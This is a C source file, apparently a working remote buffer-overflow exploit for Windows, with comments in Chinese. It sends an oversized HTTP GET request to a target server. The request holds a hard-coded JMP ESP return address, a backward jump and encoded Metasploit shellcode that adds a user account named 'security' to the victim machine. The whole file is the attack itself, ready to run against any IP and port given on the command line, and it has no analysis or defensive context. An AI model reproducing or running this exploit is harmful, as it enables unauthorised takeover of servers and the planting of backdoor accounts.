#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")

/* win32_adduser -  PASS=security EXITFUNC=thread USER=security Size=500 Encoder=Alpha2 http://metasploit.com */
unsigned char shellcode[] =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x37\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x6a"
"\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x7a\x32\x41\x42\x32\x42"
"\x41\x30\x42\x41\x41\x58\x38\x41\x42\x50\x75\x6b\x59\x6b\x4c\x6b"
"\x58\x42\x64\x57\x70\x57\x70\x75\x50\x4e\x6b\x73\x75\x55\x6c\x4c"
"\x4b\x51\x6c\x43\x35\x54\x38\x47\x71\x38\x6f\x6e\x6b\x50\x4f\x52"
"\x38\x6e\x6b\x43\x6f\x65\x70\x46\x61\x7a\x4b\x73\x79\x4e\x6b\x30"
"\x34\x6c\x4b\x76\x61\x38\x6e\x64\x71\x69\x50\x7a\x39\x6c\x6c\x4f"
"\x74\x4b\x70\x44\x34\x65\x57\x4f\x31\x58\x4a\x44\x4d\x33\x31\x4f"
"\x32\x48\x6b\x4b\x44\x45\x6b\x33\x64\x74\x64\x66\x64\x71\x65\x6d"
"\x35\x4c\x4b\x33\x6f\x61\x34\x36\x61\x5a\x4b\x43\x56\x4e\x6b\x34"
"\x4c\x50\x4b\x6e\x6b\x73\x6f\x67\x6c\x47\x71\x7a\x4b\x4c\x4b\x57"
"\x6c\x6c\x4b\x64\x41\x38\x6b\x4d\x59\x31\x4c\x66\x44\x44\x44\x5a"
"\x63\x30\x31\x49\x50\x63\x54\x6c\x4b\x63\x70\x36\x50\x6e\x65\x6b"
"\x70\x64\x38\x64\x4c\x6e\x6b\x33\x70\x44\x4c\x4e\x6b\x42\x50\x67"
"\x6c\x6c\x6d\x6c\x4b\x62\x48\x75\x58\x48\x6b\x36\x69\x4e\x6b\x6d"
"\x50\x78\x30\x65\x50\x67\x70\x75\x50\x6c\x4b\x30\x68\x65\x6c\x73"
"\x6f\x50\x31\x4b\x46\x35\x30\x66\x36\x6b\x39\x6c\x38\x6c\x43\x59"
"\x50\x43\x4b\x30\x50\x31\x78\x4a\x4f\x5a\x6e\x4d\x30\x55\x30\x62"
"\x48\x6e\x78\x49\x6e\x6f\x7a\x36\x6e\x72\x77\x39\x6f\x49\x77\x70"
"\x63\x70\x6d\x53\x54\x76\x4e\x43\x55\x31\x68\x30\x65\x37\x50\x36"
"\x4f\x32\x43\x45\x70\x62\x4e\x62\x45\x73\x44\x45\x70\x63\x45\x44"
"\x33\x43\x55\x50\x72\x77\x50\x53\x43\x70\x65\x45\x33\x54\x35\x62"
"\x52\x75\x39\x72\x54\x41\x69\x45\x70\x62\x53\x35\x35\x35\x33\x51"
"\x65\x61\x62\x45\x39\x74\x34\x64\x39\x51\x30\x56\x4f\x41\x51\x62"
"\x64\x62\x64\x57\x50\x76\x46\x57\x56\x71\x30\x50\x6e\x51\x75\x51"
"\x64\x57\x50\x72\x4c\x42\x4f\x53\x53\x61\x71\x70\x6c\x52\x47\x31"
"\x62\x42\x4f\x71\x65\x52\x50\x35\x70\x42\x61\x43\x54\x50\x6d\x75"
"\x39\x42\x4e\x52\x49\x73\x43\x41\x64\x50\x72\x31\x71\x30\x74\x52"
"\x4f\x52\x52\x51\x63\x45\x70\x41\x63\x71\x75\x72\x43\x71\x65\x54"
"\x32\x65\x39\x61\x64\x31\x69\x75\x70\x34\x6f\x61\x51\x33\x74\x33"
"\x74\x45\x50\x6a";


int main(int argc, char *argv[])
{
	WSADATA ws;	
	SOCKET	s		= INVALID_SOCKET;	//Socket Object
	int nLen		= 0;			//Buffer length
	char buf[5000]		= {0};
	struct sockaddr_in server;
	
	if (argc != 3)
	{
		printf("[*]Usage:%s Remote Port\n", argv[0]);
		return 0;
	}
	//初始化wsa
	WSAStartup(MAKEWORD(2,2),&ws);
	//建立socket
	s=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	//设置远程主机地址结构
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[2]));
	server.sin_addr.s_addr = inet_addr(argv[1]);

	//连接远程计算机！
	if (connect(s,(struct sockaddr *)&server,sizeof(server) ) < 0)
	{
		printf("connect error");
		return -1;
	}

	memset(buf, '\x41', 5000);
	memcpy(buf, "GET /", 5);

	memcpy(buf + 4052, "\x12\x45\xfa\x7f", 4);	//JMP ESP
	memcpy(buf + 4056, "\xE9\x43\xF4\xFF\xFF", 5);	//Jmp -3000
	memcpy(buf + 2000, shellcode, 500);		//ShellCode
	
	buf[4080+5] = '\0';
	strcat(buf, " HTTP/1.0\x0D\x0A\x0D\x0A");

	//构造字符串后，发送
	nLen = sizeof(buf)-1;
	send(s, buf, nLen , 0);

	printf("send EvilCode Ok!");
	closesocket(s); 
	WSACleanup(); 

	return 0;
}

